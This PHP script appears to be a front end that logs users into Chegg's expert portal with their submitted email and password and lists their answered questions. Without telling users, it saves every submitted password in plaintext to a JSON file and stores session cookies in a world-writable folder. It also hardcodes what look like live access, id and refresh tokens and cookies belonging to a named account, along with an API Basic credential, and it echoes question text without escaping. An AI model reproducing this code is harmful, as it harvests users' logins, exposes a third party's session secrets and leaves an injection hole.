<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
$email = $_POST['email'];
$password = $_POST['password'];
$folder2 = 'LoginID';  // Specify your folder name here
$file_name = $folder2 . '/user_data.json';

if (!is_dir($folder2)) {
    mkdir($folder2, 0755, true);  // Create the folder with appropriate permissions
}

// Check if the JSON file already exists
if (file_exists($file_name)) {
    // If the file exists, read its content and decode it into an array
    $json_data = file_get_contents($file_name);
    $data = json_decode($json_data, true);
} else {
    // If the file doesn't exist, start with an empty array
    $data = [];
}

// Add the new data to the array
$new_data = [
    'email' => $email,
    'password' => $password
];

$data[] = $new_data;

// Encode the updated array to JSON
$json_data = json_encode($data);

// Save the JSON data back to the file
file_put_contents($file_name, $json_data);

$curl = curl_init();
// Set some options - we are passing in a useragent too here
$cookieFile = "cookies_" . $email . ".txt";
$folder = "store";
$folderPath = __DIR__ . '/' . $folder;
if (!file_exists($folderPath)) {
    mkdir($folderPath, 0777, true); // Creates the folder recursively
}

$filePath = $folderPath . '/' . $cookieFile;
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://expert.chegg.com/api/auth/login',
  CURLOPT_COOKIEJAR => $filePath,
  CURLOPT_COOKIEFILE => $filePath,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"email":"'.$email.'","password":"'.$password.'"}',
  CURLOPT_HTTPHEADER => array(
    'authority: expert.chegg.com',
    'accept: application/json, text/plain, */*',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'dnt: 1',
    'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjUwMTM1NiIsImFwIjoiMTA4NTE1NTg0OCIsImlkIjoiZTYwY2I0MjIxYzc5MGE1NiIsInRyIjoiNDg0YTEyNGViOGJjMDE4OTM0ODIxNTc5NTIzMjc2YmQiLCJ0aSI6MTY5NzEzMDE1MzExNCwidGsiOiI2NTM2NiJ9fQ==',
    'origin: https://expert.chegg.com',
    'referer: https://expert.chegg.com/auth/login?redirectTo=https%3A%2F%2Fexpert.chegg.com%2Fauth',
    'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Linux"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'traceparent: 00-484a124eb8bc018934821579523276bd-e60cb4221c790a56-01',
    'tracestate: 65366@nr=0-1-501356-1085155848-e60cb4221c790a56----1697130153114',
    'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    ),
));

$response = curl_exec($curl);

curl_close($curl);
//echo $response;
// Check for cURL errors
if ($response === false) {
    echo 'cURL error: ' . curl_error($ch);
}

// Read the saved cookies from the file
$cookieContent = file_get_contents($filePath);

// Extract and store the cookies in an array
$cookies = array();
if (!empty($cookieContent)) {
    $cookieLines = explode("\n", $cookieContent);
    foreach ($cookieLines as $cookieLine) {
        $parts = explode("\t", $cookieLine);
        if (count($parts) >= 7) {
            $name = $parts[5];
            $value = $parts[6];
            $cookies[$name] = $value;
        }
    }
}

// Convert the cookies array to JSON and print it
$likecookies =json_encode($cookies, JSON_PRETTY_PRINT);
$likecookies2 =json_decode($likecookies,true);

function solved_question($likecookies2){
    
    $curl = curl_init();

    curl_setopt_array($curl, array(
    CURLOPT_URL => 'https://gateway.chegg.com/nestor-graph/graphql',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => '',
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS =>'{"operationName":"MyAnswerStats","variables":{},"query":"query MyAnswerStats {\\n  myAnswerStats {\\n    averageStepCount\\n    cfScore {\\n      currentDayScore\\n      currentMonthScore\\n      currentWeekScore\\n      lifeTimeScore\\n      __typename\\n    }\\n    dashboardStat {\\n      answeredDay\\n      answeredMonth\\n      answeredTotal\\n      answeredWeek\\n      answeredQuarter\\n      skippedDay\\n      skippedMonth\\n      skippedWeek\\n      skippedQuarter\\n      structuredAnsweredTotal\\n      __typename\\n    }\\n    __typename\\n  }\\n}"}',
    CURLOPT_HTTPHEADER => array(
        'accept: */*',
        'accept-language: en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6',
        'apollographql-client-name: chegg-web-producers',
        'apollographql-client-version: main-e5adc6c0-6666912886',
        'authorization: Basic alNNNG5iVHNXV0lHR2Y3OU1XVXJlQjA3YmpFeHJrRzM6SmQxbTVmd3o3aHRobnlCWg==',
        'content-type: application/json',
        'cookie: access_token='.$likecookies2['access_token'].';exp_id='.$likecookies2['exp_id'].';id_token='.$likecookies2['id_token'].';refresh_token='.$likecookies2['refresh_token'].'',
        'dnt: 1',
        'origin: https://expert.chegg.com',
        'referer: https://expert.chegg.com/',
        'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Linux"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
    ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    //echo $response;
    return json_decode($response ,true)['data']['myAnswerStats']['dashboardStat']['structuredAnsweredTotal'];

}
//echo $likecookies2['id_token'];
if(preg_match('/id_token/',$likecookies)){
    $last = solved_question($likecookies2);
    $curl = curl_init();

    curl_setopt_array($curl, array(
    CURLOPT_URL => 'https://gateway.chegg.com/nestor-graph/graphql',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => '',
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS =>'{"operationName":"myAnswers","variables":{"first":0,"last":'.$last.',"filters":{"lookbackPeriod":"ALL","rating":"ALL"}},"query":"query myAnswers($last: Int!, $first: Int!, $filters: AnswerFilters) {\\n  myAnswers(last: $last, first: $first, filters: $filters) {\\n    edges {\\n      node {\\n        answeredDate\\n        id\\n        uuid\\n        isStructuredAnswer\\n        isDeleted\\n        question {\\n          language\\n          body\\n          title\\n          isDeleted\\n          subject {\\n            subjectGroup {\\n              name\\n              __typename\\n            }\\n            __typename\\n          }\\n          uuid\\n          id\\n          questionTemplate {\\n            templateName\\n            templateId\\n            __typename\\n          }\\n          __typename\\n        }\\n        studentRating {\\n          negative\\n          positive\\n          __typename\\n        }\\n        qcReview {\\n          overallQcRating\\n          isInvalid\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    totalResults\\n    pageInfo {\\n      startCursor\\n      __typename\\n    }\\n    __typename\\n  }\\n}"}',
    CURLOPT_HTTPHEADER => array(
        'accept: */*',
        'accept-language: en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6',
        'apollographql-client-name: chegg-web-producers',
        'apollographql-client-version: main-e5adc6c0-6666912886',
        'authorization: Basic alNNNG5iVHNXV0lHR2Y3OU1XVXJlQjA3YmpFeHJrRzM6SmQxbTVmd3o3aHRobnlCWg==',
        'content-type: application/json',
        'cookie: country_code=IN; langPreference=en-US; hwh_order_ref=/homework-help/questions-and-answers/p10-198-increasing-demand-xylene-petrochemical-industry-production-xylene-toluene-dispropo-q63956832; CVID=6a66b3e4-a77f-4023-af22-d12b50da550d; V=43004ff6c22735700bf70aefd302ec156621d22714bc6c.48167900; pxcts=bbef3630-fdf1-11ee-bd67-a0bbd97c4d00; _pxvid=bbef2456-fdf1-11ee-bd67-ab9dd8697a19; _cc_id=2a8c446e26baaba0dd935e44a9b86448; panoramaId_expiry=1714097324661; panoramaId=5eee37af4fa970322070d484bbd2185ca02cd527ac89264306f0298e3e0119a1; panoramaIdType=panoDevice; permutive-id=11155a55-64e3-498f-a6b0-55d7c8aa90e3; forterToken=f587140aee98498cb9a43d14f58f8389_1713492864567__UDF43-m4_13ck_; chgmfatoken=%5B%20%22account_sharing_mfa%22%20%3D%3E%201%2C%20%22user_uuid%22%20%3D%3E%20bd91211d-756c-442f-8a22-eb3e888b2f10%2C%20%22created_date%22%20%3D%3E%202024-04-19T02%3A14%3A34.926Z%20%5D; _li_dcdm_c=.chegg.com; _lc2_fpi=cd72d4805609--01hvt26h9nwd54rgn8d72dkm7f; _lc2_fpi_meta=%7B%22w%22%3A1713492935989%7D; _pubcid=7a6867f7-29bf-43a1-84c3-74129b1d5e77; _sharedid=eb09daec-d474-4372-947d-db9e76530ffe; connectId=%7B%22vmuid%22%3A%22YhK57oEENSnTrzAGMyCrPO0rzx7fT7-CfkzLNmHB1m2U8zrYBL5lVVq55RkAb2BLmzR2T33Pd3-xBiwBpl18sw%22%2C%22connectid%22%3A%22YhK57oEENSnTrzAGMyCrPO0rzx7fT7-CfkzLNmHB1m2U8zrYBL5lVVq55RkAb2BLmzR2T33Pd3-xBiwBpl18sw%22%2C%22connectId%22%3A%22YhK57oEENSnTrzAGMyCrPO0rzx7fT7-CfkzLNmHB1m2U8zrYBL5lVVq55RkAb2BLmzR2T33Pd3-xBiwBpl18sw%22%2C%22ttl%22%3A86400000%2C%22he%22%3A%22646194a47a2b2e18763a050d0ea8ce091d3f36935d68d2ddb5c9245b9d14340d%22%2C%22lastSynced%22%3A1713492941478%2C%22lastUsed%22%3A1713492970855%7D; CSessionID=0957a335-cb86-4786-8ff8-5f87cddd7f86; _pubcid_cst=zix7LPQsHA%3D%3D; PHPSESSID=98a8088aa34b5d22f65d72a847f19728; SU=RYVjCtu-VWqU59N8M2vg5TjvY6yAvLOtONU6hkIBAM5LlBO0hkbnRbajnjGrBI-_LnuAK0Xr2T2TVB6pw2ps1f2B9hqyZnQhkYUWJcr1yUjYkQZRHdNbB-bmvD5z6ZtC; user_geo_location=%7B%22country_iso_code%22%3A%22IN%22%2C%22country_name%22%3A%22India%22%2C%22region%22%3A%22UP%22%2C%22region_full%22%3A%22Uttar+Pradesh%22%2C%22city_name%22%3A%22Lucknow%22%2C%22postal_code%22%3A%22226017%22%2C%22locale%22%3A%7B%22localeCode%22%3A%5B%22en-IN%22%2C%22hi-IN%22%2C%22gu-IN%22%2C%22kn-IN%22%2C%22kok-IN%22%2C%22mr-IN%22%2C%22sa-IN%22%2C%22ta-IN%22%2C%22te-IN%22%2C%22pa-IN%22%5D%7D%7D; exp=C026A; expkey=1F02FBDEE3BEABD4F9426AA9A82BFA32; opt-user-profile=bd91211d-756c-442f-8a22-eb3e888b2f10%252C27178110608%253A27168210547%252C27425410026%253A27344200451%252C27546760076%253A27590510180; _iidt=UHYOgAWE2ErHqaevecSARY+xGWf+6OBxdJadv5UK5YG20Kqh67c/y6CTfWjALNNsCoJ1cIN5QdccwVsKTut7wknqdQZ2+QQa1Ftf/HU=; _vid_t=2dN77p//9HeyLqLJzEQ+P7pDJZto7jYqi1zdgsjDbPday0LTNUNvlwdhqOaubLrTS3Hd5NeE3ZJnMfNJPkaX7kNTVLUe+k6Z9EvT4DI=; DFID=web|89QlQwo60Lmkff9G37t6; refreshToken=ext.a0.t00.v1.OGdDEm8RRg5xGtC6nKnLi96-ntTl2BwS18Bu8yZ2M1N8zAs7HeDZHPiAMONmMWTzeFzto1PbI4f6FuCP54iWyyc; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Apr+19+2024+10%3A30%3A16+GMT%2B0530+(India+Standard+Time)&version=202402.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=14fe00d9-5d1d-4bdc-8998-c8e26c9a3ffc&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&AwaitingReconsent=false&groups=fnc%3A0%2Csnc%3A1%2Ctrg%3A0%2Cprf%3A0; cto_bundle=5Lxb2V9zNld3MSUyQjc5bVhGJTJGVm0lMkJER2VwbXE2NHh5dnYwJTJGTVo2ZEhodGxpTFRLWndKYnl5QzFXMmU1U1M0Q2laQnlPVGRBUGVYSjdxNVVCbmtVMkhxb0F6UHRMeEFmMlN4UlZmNmR1YURKdW1COFBiNiUyRk9OQ0tzUkxOT25INkMwNWhHQmdrQ01YejFRaDNvY3FKT1Q0Unk4dElRJTNEJTNE; __gads=ID=68f0c23f5d69de0a:T=1713492942:RT=1713502828:S=ALNI_MalsiFB2lp-RTj9HoEq_StR9R_czA; __gpi=UID=00000df13cdb45f3:T=1713492942:RT=1713502828:S=ALNI_MYAicmA5HBaRvrqjHb1ECtBoncsMg; __eoi=ID=c29a540573c91dc9:T=1713492942:RT=1713502828:S=AA-AfjbwnSn_TmutretrDibZP-fw; _ga=GA1.1.738477884.1713526123; CSID=1713526124404; access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IllpMk90dXFUUzNjQ0M4azQ5Vk5lWCJ9.eyJodHRwOnJvbGVzIjpbImV4cGVydCIsImV4cGVydC1yZWF1dGhvci1saXZlIl0sImh0dHA6ZW1haWwiOiJrYXJrYXJtYW5zdWtoYmhhaThAZ21haWwuY29tIiwiaHR0cDpzb3VyY2VfaWQiOiJleHBlcnQiLCJpc3MiOiJodHRwczovL2NoZWdnLWV4cGVydHMuY2hlZ2cuYXV0aDAuY29tLyIsInN1YiI6ImF1dGgwfDRmZmU3NDM1LTExZDMtNGEyNC04NzBjLTllM2RhOTU4YTJmZiIsImF1ZCI6WyJodHRwczovL2NoZWdnLWV4cGVydHMuY2hlZ2cuYXV0aDAuY29tL2FwaS92Mi8iLCJodHRwczovL2NoZWdnLWV4cGVydHMuY2hlZ2cuYXV0aDAuY29tL3VzZXJpbmZvIl0sImlhdCI6MTcxMzUyNjE0OSwiZXhwIjoxNzE2MTE4MTQ5LCJzY29wZSI6Im9wZW5pZCBwcm9maWxlIGVtYWlsIHJlYWQ6Y3VycmVudF91c2VyIHVwZGF0ZTpjdXJyZW50X3VzZXJfbWV0YWRhdGEgZGVsZXRlOmN1cnJlbnRfdXNlcl9tZXRhZGF0YSBjcmVhdGU6Y3VycmVudF91c2VyX21ldGFkYXRhIGNyZWF0ZTpjdXJyZW50X3VzZXJfZGV2aWNlX2NyZWRlbnRpYWxzIGRlbGV0ZTpjdXJyZW50X3VzZXJfZGV2aWNlX2NyZWRlbnRpYWxzIHVwZGF0ZTpjdXJyZW50X3VzZXJfaWRlbnRpdGllcyBvZmZsaW5lX2FjY2VzcyIsImd0eSI6InBhc3N3b3JkIiwiYXpwIjoiU055Zmh3QlZ2SUdiU1pQSVRleFlObExtODB1cGhubkkifQ.xe9vDlu7tet8TkrQDQM4QCqrI4Wq-tjp3F_QxObn8yiStib9gCIWMVGbpG_HgR1i9-ZEiN3tYrighdogh8iIRQ1MiPlN2OlqMx6aLRPdrlI6vBtLM6uIlQvx1Byd-imzeBtzVO2eQt170mf_8n89pK6AVFFKMfzobqpk4ksQ-1wzHtPJb0tSQ-UVvjv5JyrvJ-kHQCDxIgwqTsJtYtKmHxgUryiYGA5lfKIv6C_5UpdNvYQcOPmtTtG19Cjt2CXqNai0x41NxTCGxC8Xh0v8nUKriaHm8CEzEhoTJvvlUCERI_Wo-8RqLK-kW_Z_IT6IP3fwePQTui9N3uhjhiF-4w; id_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IllpMk90dXFUUzNjQ0M4azQ5Vk5lWCJ9.eyJodHRwOnJvbGVzIjpbImV4cGVydCIsImV4cGVydC1yZWF1dGhvci1saXZlIl0sImh0dHA6c291cmNlX2lkIjoiZXhwZXJ0Iiwibmlja25hbWUiOiJrYXJrYXJtYW5zdWtoYmhhaTgiLCJuYW1lIjoia2Fya2FybWFuc3VraGJoYWk4QGdtYWlsLmNvbSIsInBpY3R1cmUiOiJodHRwczovL3MuZ3JhdmF0YXIuY29tL2F2YXRhci9hMDVkMWM0YjI3N2ExNGVhYTU3NzEwZDdjY2Y5YzkyYz9zPTQ4MCZyPXBnJmQ9aHR0cHMlM0ElMkYlMkZjZG4uYXV0aDAuY29tJTJGYXZhdGFycyUyRmthLnBuZyIsInVwZGF0ZWRfYXQiOiIyMDI0LTA0LTE5VDExOjI5OjA5Ljg5MloiLCJlbWFpbCI6Imthcmthcm1hbnN1a2hiaGFpOEBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6Ly9jaGVnZy1leHBlcnRzLmNoZWdnLmF1dGgwLmNvbS8iLCJhdWQiOiJTTnlmaHdCVnZJR2JTWlBJVGV4WU5sTG04MHVwaG5uSSIsImlhdCI6MTcxMzUyNjE0OSwiZXhwIjoxNzEzNTYyMTQ5LCJzdWIiOiJhdXRoMHw0ZmZlNzQzNS0xMWQzLTRhMjQtODcwYy05ZTNkYTk1OGEyZmYifQ.XKDt8DifvRrreDKxNPcfayf3l_RLUBlZw-ccnJfIutQnuS0GQ2_PspFi6fVV3ttXls-XV7xYZJ9xRof6LaJ_WjqQMsLFVCtLP8QZFJGw7h5FF3W5MU_UYtbhtJfUeDlw4KI0k0JEuWVIsL7IdQBwTdVbpGl4P8r1SNHRHI6DqsVXMEwfsNFM0-f-mOzuW4y3eM4sS9Mgd_vkUH4ptmeLFqEkxiolxSHW2OT1twOdnwCHw_cVzO8QLBo8YYjrvyuW0pBm5YetJIa_6HHjvwXV5_Is3-13V25xmIakjwBnji7b2-2EGQoSAA_r2DJ99gl5lAkRsBEB9KEeA0VLDvtgZg; refresh_token=70HAOaqdcvhq0dEOBpapWNMoEhU_de4fWeAOgmqhALJSf; exp_id=4ffe7435-11d3-4a24-870c-9e3da958a2ff; ab.storage.deviceId.49cbafe3-96ed-4893-bfd9-34253c05d80e=%7B%22g%22%3A%2210c3349f-83fd-9ab3-0980-73354c84a18d%22%2C%22c%22%3A1713526128092%2C%22l%22%3A1713526154267%7D; ab.storage.userId.49cbafe3-96ed-4893-bfd9-34253c05d80e=%7B%22g%22%3A%224ffe7435-11d3-4a24-870c-9e3da958a2ff%22%2C%22c%22%3A1713526154260%2C%22l%22%3A1713526154269%7D; ab.storage.sessionId.49cbafe3-96ed-4893-bfd9-34253c05d80e=%7B%22g%22%3A%22d3789c88-2927-276f-9524-1ede1e9d9145%22%2C%22e%22%3A1713527955817%2C%22c%22%3A1713526154264%2C%22l%22%3A1713526155817%7D; _ga_HRYBF3GGTD=GS1.1.1713526121.1.1.1713526174.0.0.0; _ga_1Y0W4H48JW=GS1.1.1713526123.1.1.1713526174.0.0.0',
        'dnt: 1',
        'origin: https://expert.chegg.com',
        'referer: https://expert.chegg.com/',
        'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Linux"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
    ),
    ));

    $response11 = curl_exec($curl);

    curl_close($curl);
    //echo $response11;
    $idresponse =json_decode($response11 ,true);
    //echo $idresponse;
    foreach ($idresponse['data']['myAnswers']['edges'] as $edge) {
    $id = $edge['node']['id'];
    $questionid = $edge['node']['question']['id'];
    $questionbody = $edge['node']['question']['body'];
    $dateString = $edge['node']['answeredDate'];
    $dateParts = explode('T', $dateString);
    $date = $dateParts[0];
    //echo "ID: $questionid\n";
    $idlink="https://expert.chegg.com/myanswers/".$id;
    $questionidlink = "https://www.chegg.com/homework-help/questions-and-answers/-q".$questionid;
    $experthtml .= '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ByNX</title><link rel="stylesheet" href="style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"><style>.container{max-width:800px;margin:auto;padding:20px}.question{background-color:#f8f8f8;padding:20px;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,.2);text-align:justify}.question h1{font-size:32px;margin-top:0}.question img{margin:20px auto;display:block;max-width:100%;height:auto}.copy-link{display:flex;align-items:center;justify-content:center;margin-top:20px}.copy-link input{flex:1;padding:10px;border:none;border-radius:5px;background-color:#f5f5f5;margin-right:10px}.copy-link button{padding:10px 20px;border:none;border-radius:5px;background-color:#4caf50;color:#fff;font-size:18px;cursor:pointer;transition:background-color .3s ease}.copy-link button:hover{background-color:#3e8e41}.copy-link button i{margin-right:5px}</style></head><body><div class="container"><div class="question"><h3>Question:</h3><p>'.$questionbody.'<br>Posted Date: '.$date.'<p><h3>Your Question and Copy Link Button</h3><div class="copy-link"><input type="text" id="copyText" value="'.$idlink.'"><button onclick="copyToClipboard()"><i class="fas fa-copy"></i>Copy Link</button></div><div class="copy-link"><input type="text" id="copyText" value="'.$questionidlink.'"><button onclick="copyToClipboard()"><i class="fas fa-copy"></i>Copy Link</button></div></div></div><script>function copyToClipboard(){var e=document.getElementById("copyText");e.select(),document.execCommand("copy"),alert("Copied the link: "+e.value)}</script></body></html>';
    //echo $experthtml;
    if ($questionid !== null) {
    echo $experthtml;
    } else {
        echo "Login error enter correct details";
        }
    }
    
}
}
?>
